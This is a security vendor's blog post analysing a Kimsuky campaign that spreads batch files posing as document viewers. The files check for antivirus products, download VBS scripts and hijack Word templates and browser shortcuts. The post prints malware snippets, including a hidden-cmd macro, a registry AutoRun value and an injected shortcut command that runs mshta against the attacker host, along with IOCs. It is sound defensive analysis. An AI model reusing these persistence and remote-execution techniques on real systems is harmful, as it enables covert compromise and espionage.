# Reference for threat actor for "Kimsuky, Velvet Chollima"

**Title**: Malicious Batch File (*.bat) Disguised as a Document Viewer Being Distributed (Kimsuky) - ASEC BLOG

**Source**: https://asec.ahnlab.com/en/55219/

## Content


















Malicious Batch File (*.bat) Disguised as a Document Viewer Being Distributed (Kimsuky) - ASEC BLOG





































































 

Malware Information
AhnLab Detection
Statistics
Response Guide
AhnLab
 














Posted By yeeun  , July 11, 2023 

Malicious Batch File (*.bat) Disguised as a Document Viewer Being Distributed (Kimsuky) 
AhnLab Security Emergency response Center (ASEC) has confirmed the distribution of malware in the form of a batch file (*.bat). This malware is designed to download various scripts based on the anti-malware process, including AhnLab products, installed in the user’s environment. Based on the function names used by the malware and the downloaded URL parameters, it is suspected to have been distributed by the Kimsuky group.
Although the exact distribution path of the malware has not been confirmed, it appears that it is being distributed via email. As shown below, the identified batch files have been disguised to appear as viewers for document programs such as Word and HWP.
Date of IdentificationFilenameMar. 22docview.batMar. 28pdfview.batJun. 12hwp.batJun. 20docxview.batJun. 21pdf.batTable 1. Files that have been identified.
When the batch file is executed, it accesses Google Drive and Docs through the “explorer” command. Through this process, it executes a document file uploaded to Google Docs or Drive, making it appear as if a viewer program was executed. The executed documents mostly contain content related to the military or unification.
Document TitleAccessed URLMilitary Security Review of the U.S. Indo-Pacific Strategy – Focusing on the U.S. Indo-Pacific Command.pdfhxxps://drive.google.com/file/d/1e41uC2ZTYvTc3CvS6wIKox22AGdP4nFB/view?usp=sharingConsent Form_Princeton Study.pdfhxxps://drive.google.com/file/d/1tI4J95-7HDGES8e6oHR-wu0cXD8wHPUc/view?usp=sharingBuilding a Prosperous Homeland through the Principle of Liberal Democracy: Achieving Reunification of the Korean Peninsula.pdfhxxps://docs.google.com/document/d/1NJfvSpdku2PW3gwg0dnoELrlVp3CEGB4mtNIFE4bOVE/edit?usp=sharingNK_nuclear_threat.docxhxxps://docs.google.com/document/d/1C3h0agp3E6Z4a9z-YxnMTgP3Fd9y8n2C/edit?rtpof=true&sd=trueKorea-U.S. Alliance (Global Defense)-new.hwphxxps://drive.google.com/file/d/1rCws6IDhJvynpM3TOSv3IKGWNKXI5uH9/view?usp=sharingTable 2. Identified document titles and URL addresses

Figure 1. Various normal documents that have been confirmed
Afterward, it utilizes the “wmic” command to identify various anti-malware processes. The threat actor downloads different scripts based on the type of anti-malware process that is running in the user’s environment.
Checked AV Products(Process Name)Download Path and FilenameDownload URLKaspersky(avpui.exe, avp.exe )%appdata%\Microsoft\Templates\Normal.dotmhxxp://joongang[.]site/pprb/sec/ca.php?na=dot_kasp.gifc:\users\public\videos\video.vbshxxp://joongang[.]site/pprb/sec/ca.php?na=reg0.gifAvast( avastui.exe, avgui.exe )%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\onenote.vbshxxp://joongang[.]site/pprb/sec/ca.php?na=sh_ava.gifAhnlab( v3 )%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\onenote.vbshxxps://joongang[.]site/pprb/sec/ca.php?na=sh_vb.gif%appdata%\asdfg.vbshxxps://joongang[.]site/pprb/sec/ca.php?na=vbs.gifALYac(ayagent.aye )%appdata%\asdfg.vbshxxps://joongang[.]site/pprb/sec/ca.php?na=vbs.gifIf there are no matching productsTable 2. Downloaded file for each identified AV process

When a Kaspersky (avpui.exe, avp.exe) process is identified

To replace the default document template, Normal.dotm, the threat actor terminates the Word process and downloads a dotm file from hxxp://joongang[.]site/pprb/sec/ca.php?na=dot_kasp.gif. They then replace Normal.dotm with the downloaded file. The downloaded Normal.dotm file has an embedded VBA code that executes cmd.exe in a hidden window, as shown below. Currently, it simply executes cmd.exe, but various commands could be executed depending on the threat actor’s intentions.
Sub autoopen()
    On Error Resume Next
    a = Shell("cmd.exe", 0)
End Sub
Afterward, it downloads “video.vbs” from hxxp://joongang[.]site/pprb/sec/ca.php?na=reg0.gif and registers it to the following registry to ensure continuous execution.

Registry: HKEY_CURRENT_USER\Software\Microsoft\Command Processor
Name: AutoRun
Value: wscript.exe c:\users\public\videos\video.vbs

When the “video.vbs” file is executed, it checks if a file named “qwer.gif” exists in the %appdata%\Microsoft folder. If the file exists, it renames it to “qwer.bat” and then executes it. If “qwer.gif” does not exist, it downloads and executes the file from hxxp://joongang[.]site/pprb/sec/d.php?na=battmp.
The command identified from the above URL at the time of analysis is as follows.

Figure 2. Script found in hxxp://joongang[.]site/pprb/sec/d.php?na=battmp

When an Avast (avastui.exe, avgui.exe) process is identified

The threat actor downloads an additional script from hxxp://joongang[.]site/pprb/sec/ca.php?na=sh_ava.gif and saves it in the startup programs folder under the name onenote.vbs to ensure it runs continuously.

Figure 3. Script found in hxxp://joongang[.]site/pprb/sec/ca.php?na=sh_ava.gif
When the “onenote.vbs” file is executed, it utilizes WMI to collect the Description of Win32_Battery and Win32_Process. It also performs the downloading and run key registration of the previously mentioned “video.vbs” file.
Additionally, it modifies the location or properties of browser and email-related shortcuts (*.lnk files) that exist in a specific folder. This modification is done in such a way that when the user clicks on the shortcut file to launch Outlook or a browser, the threat actor’s malicious command is executed as well.
To achieve this, the threat actor moves the browser and email-related shortcut files from C:\Users\Public\Desktop to C:\Users\[username]\Desktop\[filename]. They then modify the arguments in the properties of the shortcut files that exist in the folders mentioned in the table below.
Folder NameLNK’s Target File NameChanged LNK ArgumentsC:\Users\Public\Desktop(Moved to C:\Users\[username]\Desktop and properties changed)msedge.exechrome.exeoutlook.exewhale.exe firefox.execmd.exe /c start [filename] [previous arguments] [command configured by the threat actor]C:\Users\[username]\Desktop%appdata%\Microsoft\Internet Explorer\Quick Launch”Table 3. Folder paths and target filenames of the LNK files to be modified
At the time of analysis, the onenote.vbs file downloaded upon the confirmation of an Avast process did not contain the [command set by the threat actor]. However, various malicious commands can still be executed according to the threat actor’s intentions.
Afterward, the previously collected information is transmitted to hxxps://joongang[.]site/pprb/sec/r.php. The transmitted data is as follows.
[Battery Information] [Process Information] ENTER bin short okFormat of transmitted data

When an Ahnlab (v3) process is identified

This procedure is similar to when an Avast process is identified. An additional script file is downloaded from hxxps://joongang[.]site/pprb/sec/ca.php?na=sh_vb.gif and saved in the startup programs folder under the name onenote.vbs.

Figure 4. Script found in hxxps://joongang[.]site/pprb/sec/ca.php?na=sh_vb.gif
The aforementioned script file performs the same functionality as the previously described onenote.vbs (?na=sh_ava.gif). However, the downloaded onenote.vbs file from hxxps://joongang[.]site/pprb/sec/ca.php?na=sh_vb.gif contains the [command set by the threat actor] that is included in the arguments used upon changing the properties of shortcut files.
& echo Set ws = CreateObject(""WScript.Shell""):
a=ws.run(""mshta.exe hxxps://joongang[.]site/pprb/sec/t1.hta"",0,false) > ""%appdata%\1.vbs"" 
& start wscript.exe /b ""%appdata%\1.vbs

Figure 5. Changed LNK properties
Therefore, every time a user executes the shortcut file for a browser or Outlook, the script located at hxxps://joongang[.]site/pprb/sec/t1.hta is saved and executed as %appdata%\1.vbs. At the time of analysis, the URL contained the following command to close the window:
On Error Resume Next
window.close()
Afterward, aside from when Kaspersky (avpui.exe, avp.exe) and Avast (avastui.exe, avgui.exe) processes are identified, additional scripts are downloaded from hxxps://joongang[.]site/pprb/sec/ca.php?na=vbs.gif and saved as asdfg.vbs in the %appdata% folder.
The downloaded asdfg.vbs file is registered in the task scheduler as CleanupTemporaryState and scheduled to run every 41 minutes.Like the video.vbs file, the asdfg.vbs file downloads and executes additional scripts from hxxps://joongang[.]site/pprb/sec/d.php?na=battmp.
At the time of analysis, behaviors such as downloading executable files were not present. However, due to the nature of downloading and executing various scripts, there is a possibility of additional unidentified malicious activities being carried out based on the commands present in the scripts. Furthermore, the threat actor replaced the default document template, Normal.dotm, and modified browser and email-related shortcut files.  Therefore, since there is a possibility of malicious scripts being installed upon the execution of shortcut files (*.lnk) of Word documents, Internet browsers like Chrome, and Outlook, extra caution is advised.
[File Detection]Downloader/BAT.Generic.S2300 (2023.06.26.03)Trojan/VBS.Agent.SC190255 (2023.06.30.00)Trojan/VBS.Agent.SC190256 (2023.06.30.00)Downloader/VBS.Agent.SC190254 (2023.06.30.00)
[Behavior Detection]Execution/MDP.Curl.M4675Execution/MDP.Curl.M11183Execution/EDR.Curl.M11182
[IOC]
MD57d79901b01075e29d8505e72d225ff5200119ed01689e76cb7f33646693ecd6a8536d838dcdd026c57187ec2c3aec0f6a7ac7d100184078c2aa5645552794c19
URLhxxp://joongang.site/pprb/sec/hxxp://joongang.site/doc/hxxp://joongang.site/docx/hxxp://namsouth.com/gopprb/OpOpO/hxxp://staradvertiser.store/signal/
[References]https://www.sentinelone.com/labs/kimsuky-evolves-reconnaissance-capabilities-in-new-global-campaign/
Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.


Categories:Malware Information 
Tagged as:BAT,Kimsuky 




Deep Web & Dark Web Threat Trend Report – May 2023 

Analysis of the Rekoobe Backdoor Being Used In Attacks Against Linux Systems in Korea 







5
2
votes
Article Rating

 





 Subscribe




 Login 




Notify of 


new follow-up comments
new replies to my comments








 







 


Label












{}
[+]

 















Name*





Email





Website






[Important] Consent to Collection and Use of Personal Information


Purpose: Identify the contact information of user who left a comment and respond to inquiries on our blog posts.
Personal Information We Collect: Name of user and organization, Email address
Period of Retention: We store personal information for 3 months. Then, we delete and destroy personal information without delay.

 



I agree to AhnLab’s collection and use of personal information.




















Δ 










 


Label












{}
[+]

 















Name*





Email





Website






[Important] Consent to Collection and Use of Personal Information


Purpose: Identify the contact information of user who left a comment and respond to inquiries on our blog posts.
Personal Information We Collect: Name of user and organization, Email address
Period of Retention: We store personal information for 3 months. Then, we delete and destroy personal information without delay.

 



I agree to AhnLab’s collection and use of personal information.




















Δ 






4 Comments                    









 Inline Feedbacks                    
View all comments











Malicious Batch File (*.bat) Disguised as a Document Viewer Being Distributed (Kimsuky) - Ciberdefensa



    7 months ago













[…] post Malicious Batch File (*.bat) Disguised as a Document Viewer Being Distributed (Kimsuky) appeared first on ASEC […]






0






Reply













More From Our Main Blog: Illicit Brand Impersonation | A Threat Hunting Approach – WordPress on Azure



    6 months ago













[…] potential to malicious Kimsuky attributed .hwp documents. This domain was later reported on by the AhnLab team. So not only does the technique work, it can lead to the discovery of interesting new APT […]






0






Reply













Warning Against HWP Documents Embedded with Malicious OLE Objects - Ciberdefensa



    3 months ago













[…] the malware from the post in June [2] also being distributed through HWP documents, there are multiple malicious HWP documents in […]






0






Reply













Warning Against HWP Documents Embedded with Malicious OLE Objects - ASEC BLOG



    3 months ago













[…] the malware from the post in June [2] also being distributed through HWP documents, there are multiple malicious HWP documents in […]






0






Reply




 













Archives Archives

Select Month
 February 2024 
 January 2024 
 December 2023 
 November 2023 
 October 2023 
 September 2023 
 August 2023 
 July 2023 
 June 2023 
 May 2023 
 April 2023 
 March 2023 
 February 2023 
 January 2023 
 December 2022 
 November 2022 
 October 2022 
 September 2022 
 August 2022 
 July 2022 
 June 2022 
 May 2022 
 April 2022 
 March 2022 
 February 2022 
 January 2022 
 December 2021 
 November 2021 
 October 2021 
 September 2021 
 August 2021 
 July 2021 
 June 2021 
 May 2021 
 April 2021 
 March 2021 
 February 2021 
 January 2021 
 December 2020 
 November 2020 
 September 2020 
 August 2020 
 July 2020 
 June 2020 
 May 2020 
 April 2020 
 March 2020 
 February 2020 
 December 2019 
 November 2019 
 October 2019 
 September 2019 
 August 2019 
 June 2019 
 May 2019 
 April 2019 
 March 2019 
 February 2019 
 January 2019 
 November 2018 
 July 2018 
 April 2018 
 February 2018 


FOLLOW US


LinkedIn   


X   


RSS Feed   









footer(en) 220, Pangyoyeok-ro, Bundang-gu, Seongnam-si, Gyeonggi-do, Korea | Privacy & Security© AhnLab, Inc. All rights reserved.family site


한국 (한국어)
Global (English)
日本 (日本語)
 




wpDiscuzInsert 









 




















































































Loading Comments...



 


Write a Comment...




Email



Name



Website















































































































































































































































